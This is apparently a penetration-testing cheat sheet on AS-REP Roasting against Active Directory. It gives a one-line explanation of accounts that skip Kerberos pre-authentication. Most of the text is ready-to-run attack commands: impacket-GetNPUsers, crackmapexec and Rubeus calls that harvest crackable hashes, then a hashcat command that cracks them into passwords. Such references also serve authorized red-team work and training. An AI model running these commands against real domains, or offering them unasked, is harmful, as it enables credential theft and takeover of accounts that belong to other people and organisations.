# AS-REP Roasting
Because UF_DONT_REQUIRE_PREAUTH is set for an account, it doesn't need to pre authenticate itself. Therefore every user can request an AS-REP session key encrypted with the targeted accounts key, and then crack it to obtain the password for that account.

Requirements:
* List with users without creds OR an user with creds

## Remote
Users without creds from file:
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` 

Any user with creds - get all non pre-auth accounts:
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>`

## Local
`Rubeus.exe asreproast /format:hashcat /nowrap`

## Hashcat
`hashcat -m 18200 <HASH> <PASSLIST> --potfile-disable`